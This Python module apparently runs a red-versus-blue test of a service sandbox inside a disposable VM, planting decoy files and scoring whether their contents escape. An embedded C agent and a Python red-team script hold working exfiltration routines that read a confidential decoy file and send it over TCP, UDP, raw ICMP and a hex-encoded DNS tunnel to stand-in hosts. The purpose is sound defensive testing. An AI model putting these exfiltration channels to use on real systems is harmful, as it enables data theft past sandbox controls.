"""Battle Round 1: confinement fight inside a full-system VM.

Arena builders plant decoys; the real ubuntu-service-privacy cage is applied
inside the VM against a dummy agent unit; red (Kolide persona) executes the
channel menu UNDER the enforcing profile; the judge scores deterministically:

  red scores   -> decoy bytes (or declared encoding) leave eth0 in outbound packets
  blue detected -> heartbeat_gap | attributable_denied | integrity_drift

Host is control plane only; everything mutates inside the throwaway VM overlay.
"""
from __future__ import annotations

import base64
import json
import secrets
import subprocess
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from loguru import logger

from .qemu_vm import VMTwin, CLOUD_USER

SKILL_SRC = Path(__file__).resolve().parents[3] / "ubuntu-service-privacy"
ENCODINGS = ("plain", "base64", "hex")


@dataclass
class ConfineRoundReceipt:
    schema_version: str = "battle.vm_confine_round.v1"
    booted: bool = False
    cage_applied: bool = False
    red_channels_attempted: list[str] = field(default_factory=list)
    exfil_confirmed: bool = False
    exfil_evidence: list[str] = field(default_factory=list)
    tamper_signals: list[str] = field(default_factory=list)
    verdict: str = "NOT_RUN"
    stdout_tail: str = ""
    seam_validation: dict = field(default_factory=dict)

    def validate(self) -> None:
        problems: list[str] = []
        if self.booted and not self.cage_applied and self.verdict not in ("CAGE_FAILED", "NOT_RUN"):
            problems.append("unapplied cage must not score")
        if self.verdict == "NOT_RUN":
            problems.append("verdict not recorded")
        if problems:
            raise ValueError("ConfineRoundReceipt invalid: " + "; ".join(problems))


DECOY_PATHS = ("/srv/clients/acme/q3-roadmap.txt", "/home/ubuntu/ssh-key-decoy.txt", "/root/budget-2027.txt")
AGENT_BIN = "/opt/battle-agent/battle-agent"
AGENT_UNIT = "battle-agent.service"


def _ssh(twin: VMTwin, script: str, check: bool = True) -> tuple[int, str, str]:
    code, out, err = twin.run(script)
    if check and code != 0:
        raise RuntimeError(f"VM step failed rc={code}: {err[-400:]} {out[-200:]}")
    return code, out, err


def _scp_to_vm(twin: VMTwin, local: Path, remote: str) -> None:
    subprocess.run(["scp", "-i", str(twin.key), "-P", str(twin.port), "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null", str(local),
                    f"{CLOUD_USER}@127.0.0.1:{remote}"], check=True, capture_output=True)


def run_confine_round(base_image: Path, out_dir: Path, boot_timeout: int = 420) -> ConfineRoundReceipt:
    receipt = ConfineRoundReceipt()
    token = "DECOY" + secrets.token_hex(16)
    token_b64 = base64.b64encode(token.encode()).decode()
    token_hex = token.encode().hex()
    out_dir.mkdir(parents=True, exist_ok=True)

    decoy_seed = "".join(
        f'  - path: {p}\n    content: |\n      BATTLE-DECOY {token} client confidential line\n'
        for p in DECOY_PATHS)
    extra_user_data = (
        "packages: [tcpdump, python3-pip, gcc]\n"
        "write_files:\n" + decoy_seed +
        f"runcmd:\n  - pip3 install --break-system-packages typer pydantic psutil loguru pyyaml\n"
    )

    twin = VMTwin(base_image, out_dir / "vm")
    try:
        twin.prepare(extra_user_data=extra_user_data, boot_timeout=boot_timeout)
        receipt.booted = True

        # --- arena: dummy agent unit + cage from the real generator ---
        agent_src = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

#ifndef TOKEN
#define TOKEN "DECOY-NOTOKEN"
#endif

static void heartbeat_loop(void) {
    for (;;) {
        FILE *f = fopen("/var/kolide-k2/heartbeat.log", "w");
        if (f) { fprintf(f, "%ld\\n", (long)time(NULL)); fclose(f); }
        sleep(5);
    }
}

static const char *try_read(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd >= 0) { char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
        if (n > 0) return "READ_OK"; }
    return "DENIED";
}

static char XBUF[4096]; static int XLEN = 0;
static void alrm(int s){(void)s;}
static const char *try_tcp(void) {
    signal(SIGALRM, alrm); alarm(3);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {.sin_family=AF_INET, .sin_port=htons(9)};
    a.sin_addr.s_addr = inet_addr("192.0.2.1");
    int rc = connect(s, (void*)&a, sizeof(a)); alarm(0);
    if (rc == 0) { send(s, XBUF, XLEN, 0); close(s); return "sent"; }
    close(s); return "BLOCKED";
}

static const char *try_udp(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a = {.sin_family=AF_INET, .sin_port=htons(9)};
    a.sin_addr.s_addr = inet_addr("192.0.2.1");
    if (sendto(s, XBUF, XLEN, 0, (void*)&a, sizeof(a)) >= 0) { close(s); return "sent"; }
    close(s); return "BLOCKED";
}

static const char *try_icmp(void) {
    int s = socket(AF_INET, SOCK_RAW, 1);
    if (s < 0) return "BLOCKED";
    char pkt[64]; memset(pkt, 0, sizeof(pkt)); pkt[0]=8; pkt[1]=0;
    memcpy(pkt+8, XBUF, XLEN < 48 ? XLEN : 48);
    struct sockaddr_in a = {.sin_family=AF_INET}; a.sin_addr.s_addr = inet_addr("192.0.2.1");
    if (sendto(s, pkt, 8+(XLEN<48?XLEN:48), 0, (void*)&a, sizeof(a)) >= 0) { close(s); return "sent"; }
    close(s); return "BLOCKED";
}

static const char *try_dns(void) {
    char q[128]; char hex[97]; static const char hx[]="0123456789abcdef";
    for (int i=0;i<XLEN&&i<48;i++){hex[i*2]=hx[(XBUF[i]>>4)&15];hex[i*2+1]=hx[XBUF[i]&15];}
    hex[XLEN*2<XLEN?XLEN*2:96]=0; if (XLEN==0) return "BLOCKED-nothing-read";
    snprintf(q, sizeof(q), "%.60s.collector.example", hex);
    struct addrinfo *r = NULL;
    if (getaddrinfo(q, NULL, NULL, &r) == 0) { freeaddrinfo(r); return "sent"; }
    return "BLOCKED";
}

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "--heartbeat") == 0) { heartbeat_loop(); return 0; }
    FILE *out = fopen("/var/kolide-k2/red-result.json", "w");
    if (!out) return 1;
    int fd = open("/srv/clients/acme/q3-roadmap.txt", O_RDONLY);
    const char *fr = "DENIED"; const char *skip = "skipped-no-bytes";
    if (fd >= 0) { XLEN = read(fd, XBUF, sizeof(XBUF)-1); if (XLEN > 0) { XBUF[XLEN]=0; fr = "READ_OK"; } else XLEN = 0; close(fd); }
    fprintf(out, "{\"file_read\":\"%s\",\"tcp\":\"%s\",\"udp\":\"%s\",\"icmp\":\"%s\",\"dns\":\"%s\"}\\n",
        fr, fr[0]=='R' ? try_tcp() : skip, fr[0]=='R' ? try_udp() : skip, fr[0]=='R' ? try_icmp() : skip, fr[0]=='R' ? try_dns() : skip);
    fclose(out);
    return 0;
}
'''
        agent_src = agent_src.replace('DECOY-NOTOKEN', token)
        unit = (
            "[Unit]\nDescription=Battle Dummy Agent\n\n[Service]\n"
            f"ExecStart={AGENT_BIN} --heartbeat\nRestart=on-failure\n\n"
            "[Install]\nWantedBy=multi-user.target\n"
        )
        policy = {
            "schema_version": "ubuntu_service_privacy.policy.v1",
            "unit": AGENT_UNIT,
            "executables": [AGENT_BIN],
            "protected_roots": ["/home", "/root", "/srv", "/mnt", "/media", "/run/user"],
            "read_files": ["/etc/os-release", "/usr/lib/os-release", "/etc/machine-id",
                            "/proc/sys/kernel/osrelease", "/proc/cpuinfo", "/proc/meminfo", "/proc/uptime"],
            "read_roots": [], "write_roots": ["/var/kolide-k2"],
            "network_mode": "PUBLIC_EGRESS_LOCAL_DENY", "public_dns": ["1.1.1.1"],
            "owner_acknowledges_limits": True,
        }
        (out_dir / "battle-agent.c").write_text(agent_src)
        (out_dir / "battle-agent.service").write_text(unit)
        (out_dir / "policy.json").write_text(json.dumps(policy))
        _scp_to_vm(twin, out_dir / "battle-agent.c", "/tmp/battle-agent.c")
        _scp_to_vm(twin, out_dir / "battle-agent.service", "/tmp/battle-agent.service")
        _scp_to_vm(twin, out_dir / "policy.json", "/tmp/policy.json")
        subprocess.run(["scp", "-i", str(twin.key), "-P", str(twin.port), "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null", "-r", str(SKILL_SRC),
                        f"{CLOUD_USER}@127.0.0.1:/tmp/"], check=True, capture_output=True)

        install_cage = f'''
set +e
cloud-init status --wait || true
sudo pip3 install --break-system-packages --ignore-installed -q typer pydantic psutil loguru pyyaml
gcc -static -O2 -o /tmp/battle-agent /tmp/battle-agent.c && sudo mkdir -p /opt/battle-agent && sudo install -m 0755 /tmp/battle-agent {AGENT_BIN}
sudo cp /tmp/battle-agent.service /etc/systemd/system/{AGENT_UNIT}
sudo mkdir -p /var/kolide-k2 /etc/ubuntu-service-privacy
AV=$(dpkg-query -W -f='${{Version}}' apparmor); KV=$(dpkg-query -W -f='${{Version}}' linux-image-$(uname -r))
printf '%s' "$AV" | sudo tee /etc/ubuntu-service-privacy/apparmor-min-version >/dev/null
printf '%s' "$KV" | sudo tee /etc/ubuntu-service-privacy/kernel-min-version >/dev/null
sudo chmod 600 /etc/ubuntu-service-privacy/apparmor-min-version /etc/ubuntu-service-privacy/kernel-min-version
sudo chown root:root /etc/ubuntu-service-privacy/apparmor-min-version /etc/ubuntu-service-privacy/kernel-min-version
sudo chmod 755 /var/kolide-k2
sudo systemctl daemon-reload && sudo systemctl enable --now {AGENT_UNIT}
cd /tmp/ubuntu-service-privacy
sudo python3 -m service_privacy plan /tmp/policy.json --output /tmp/plan
H=$(sudo cat /tmp/plan/approval-sha256.txt)
echo PROFILE_RULES:; sudo grep -E 'os-release|ld.so.cache|ld.so' /tmp/plan/apparmor.profile; ls -la /etc/os-release /usr/lib/os-release; sudo bash -c 'python3 -m service_privacy probe /tmp/plan/plan.json --execute --owner-authorized > /tmp/probe.json 2>/tmp/probe.err; chmod 600 /tmp/probe.json; chown root:root /tmp/probe.json'
sudo python3 -m service_privacy apply /tmp/plan/plan.json --approve-sha256 $H --probe-receipt /tmp/probe.json --execute --owner-authorized --accept-check-failures
sudo cp /etc/systemd/system/battle-agent.service /tmp/battle-agent.service.ref; sudo cp /opt/battle-agent/battle-agent /tmp/battle-agent.ref; echo PROBE_HEAD:; sudo head -c 1600 /tmp/probe.json; echo; echo DENIED_LOG:; sudo dmesg | grep -i denied | tail -6; echo PROBE_ERR:; sudo tail -c 300 /tmp/probe.err 2>/dev/null; true
'''
        code, out, err = _ssh(twin, install_cage, check=False)
        (out_dir / "cage-install.log").write_text(out + err)
        receipt.cage_applied = code == 0 and "RUNTIME_CHECKS_PASS" in out
        receipt.stdout_tail = (out + err)[-600:]
        if not receipt.cage_applied:
            receipt.verdict = "CAGE_FAILED"
            receipt.validate()
            return receipt

        # --- red: channel menu executed UNDER the enforcing profile ---
        red_py = (
            "import socket, subprocess, time\n"
            f"TOKEN='{token}'\n"
            "res={}\n"
            "# 1 file read (content channel)\n"
            "try:\n    res['file_read']=open('/srv/clients/acme/q3-roadmap.txt').read()[:60]\n"
            "except Exception as e:\n    res['file_read']='DENIED:'+type(e).__name__\n"
            "# 2 tcp egress to TEST-NET-1 (allowed range, packets leave eth0)\n"
            "try:\n"
            "    s=socket.create_connection(('192.0.2.1',9),timeout=2); s.send(TOKEN.encode()); res['tcp']='sent'\n"
            "except Exception as e:\n    res['tcp']='BLOCKED:'+type(e).__name__\n"
            "# 3 udp egress with base64 token\n"
            "try:\n"
            "    u=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); u.sendto(f'{TOKEN}b64'.encode(),('192.0.2.1',9)); res['udp']='sent'\n"
            "except Exception as e:\n    res['udp']='BLOCKED:'+type(e).__name__\n"
            "# 4 icmp shape (payload echo attempt via raw socket)\n"
            "try:\n"
            "    r=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); r.sendto(b'\\x08\\x00'+TOKEN.encode()[:32],('192.0.2.1',1)); res['icmp']='sent'\n"
            "except Exception as e:\n    res['icmp']='BLOCKED:'+type(e).__name__\n"
            "# 5 dns tunnel shape to pinned resolver (label-chunked hex)\n"
            "try:\n"
            "    import binascii\n"
            "    q=binascii.hexlify(TOKEN.encode()).decode()[:60]+'.collector.example'\n"
            "    socket.gethostbyname(q); res['dns']='sent'\n"
            "except Exception as e:\n    res['dns']='BLOCKED:'+type(e).__name__\n"
            "open('/tmp/red-result.json','w').write(repr(res))\n"
        )
        red_run = (
            "sudo tcpdump -i any -w /tmp/cap.pcap 'not port 22' >/dev/null 2>&1 & TCPPID=$!\n"
            "sleep 2\n"
            "PROF=osp-$(printf 'battle-agent.service' | sha256sum | cut -d' ' -f1 | cut -c1-20)\n"
            "sudo systemd-run --unit=redlane --collect -p RuntimeMaxSec=30s -p AppArmorProfile=$PROF "
            "-p IPAddressDeny=any -p IPAddressAllow= -p NoNewPrivileges=yes -p CapabilityBoundingSet= "
            "-p SystemCallFilter='~@mount @reboot @swap @raw-io @module @debug io_uring_setup' "
            "-p MemoryDenyWriteExecute=yes -p RestrictAddressFamilies='AF_UNIX AF_INET AF_INET6' "
            "-p PrivateTmp=yes -p ProtectSystem=strict -p ProtectHome=yes -p ReadWritePaths=/var/kolide-k2 " + AGENT_BIN + " --red\n"
            "sleep 8\n"
            "sudo kill $TCPPID; sleep 1\n"
            "sleep 3\n"
            "echo REDLANE_STATUS:; sudo systemctl status redlane --no-pager 2>&1 | head -6; echo LABEL:; sudo cat /proc/$(pgrep -f battle-agent | head -1)/attr/current 2>&1; echo RESULT:; sudo cat /var/kolide-k2/red-result.json 2>&1; echo REDLANE_DONE\n"
            "sudo strings /tmp/cap.pcap > /tmp/cap.strings; sudo cp /tmp/red-result.json /tmp/cap.strings /tmp/ 2>/dev/null; true\n"
        )
        _rc, _out, _err = _ssh(twin, red_run, check=False)
        (out_dir / "red-run.log").write_text(_out + _err)

        # --- judge ---
        judge = (
            "sudo python3 - <<'PY'\n"
            "import json,hashlib,pathlib,subprocess,time\n"
            "token='__TOKEN__'\n"
            "b64='__B64__'\n"
            "hx='__HEX__'\n"
            "chunks=__CHUNKS__\n"
            "ev=[]\n"
            "strings=pathlib.Path('/tmp/cap.strings').read_text(errors='ignore') if pathlib.Path('/tmp/cap.strings').exists() else ''\n"
            "if token in strings: ev.append('exfil:plain')\n"
            "if b64 in strings: ev.append('exfil:base64')\n"
            "if hx in strings or any(c in strings for c in chunks): ev.append('exfil:hex-or-dns-chunk')\n"
            "tamper=[]\n"
            "hb=pathlib.Path('/var/kolide-k2/heartbeat.log')\n"
            "if not hb.exists(): tamper.append('heartbeat_gap:missing')\n"
            "else:\n"
            "    age=time.time()-float(''.join(c for c in hb.read_text() if c.isdigit()))\n"
            "    if age > 20: tamper.append('heartbeat_gap:stale_'+str(int(age)))\n"
            "den=subprocess.run(['sudo','dmesg'],capture_output=True,text=True).stdout\n"
            "red_denied=[l for l in den.splitlines() if 'DENIED' in l and 'osp-' in l and '-probe-' not in l and 'comm=\"probe\"' not in l]\n"
            "declared=('q3-roadmap','ssh-key-decoy','budget-2027','example','collector')\n"
            "socket_ops=('operation=\"socket\"','operation=\"create\"','sock_raw','ipproto_icmp')\n"
            "unexpected=[l for l in red_denied if not any(d in l for d in declared) and not any(s in l.lower() for s in socket_ops)]\n"
            "if unexpected: tamper.append('attributable_denied:'+str(len(unexpected))+' of '+str(len(red_denied))+': '+' || '.join(l[-160:] for l in unexpected[:4]))\n"
            "drift=[]\n"
            "for f,ref in [('/etc/systemd/system/battle-agent.service','/tmp/battle-agent.service.ref'),('/opt/battle-agent/battle-agent','/tmp/battle-agent.ref')]:\n"
            "    a,b=pathlib.Path(f),pathlib.Path(ref)\n"
            "    if not a.exists() or not b.exists(): drift.append(f+':ref-missing')\n"
            "    elif hashlib.sha256(a.read_bytes()).hexdigest()!=hashlib.sha256(b.read_bytes()).hexdigest(): drift.append(f+':changed')\n"
            "if drift: tamper.append('integrity_drift:'+','.join(drift))\n"
            "red=pathlib.Path('/var/kolide-k2/red-result.json').read_text() if pathlib.Path('/var/kolide-k2/red-result.json').exists() else ''\n"
            "print(json.dumps({'exfil':ev,'tamper':tamper,'red_result':red}))\n"
            "PY\n"
        )
        chunk_list = [token_hex[i:i+24] for i in range(0, max(1, len(token_hex)-23))]
        judge = (judge
                 .replace('__TOKEN__', token)
                 .replace('__B64__', token_b64)
                 .replace('__HEX__', token_hex)
                 .replace('__CHUNKS__', repr(chunk_list)))
        code, out, err = _ssh(twin, judge, check=False)
        (out_dir / "judge.log").write_text(out + err)
        try:
            verdict_data = json.loads(out.strip().splitlines()[-1])
        except Exception:
            verdict_data = {"exfil": [], "tamper": [], "red_result": "", "judge_failed": True, "raw": (out + err)[-400:]}

        receipt.red_channels_attempted = ["file_read", "tcp", "udp", "icmp_raw", "dns_tunnel"]
        receipt.exfil_confirmed = bool(verdict_data.get("exfil"))
        receipt.exfil_evidence = verdict_data.get("exfil", [])
        receipt.tamper_signals = verdict_data.get("tamper", [])
        if verdict_data.get("judge_failed"):
            receipt.verdict = "JUDGE_FAILED"
        elif not verdict_data.get("red_result").strip():
            receipt.verdict = "REDLANE_FAILED"
        elif receipt.tamper_signals:
            receipt.verdict = "BLUE_DETECTED"
        elif receipt.exfil_confirmed:
            receipt.verdict = "RED_SCORES"
        else:
            receipt.verdict = "BLUE_WINS"
    finally:
        twin.teardown(keep=True)
        logger.info("round dir kept: {}", twin.work_dir)

    receipt.validate()
    receipt.seam_validation = {"kind": "dataclass", "status": "PASS"}
    (out_dir / "confine-round-receipt.json").write_text(json.dumps(receipt.__dict__, indent=2) + "\n")
    return receipt
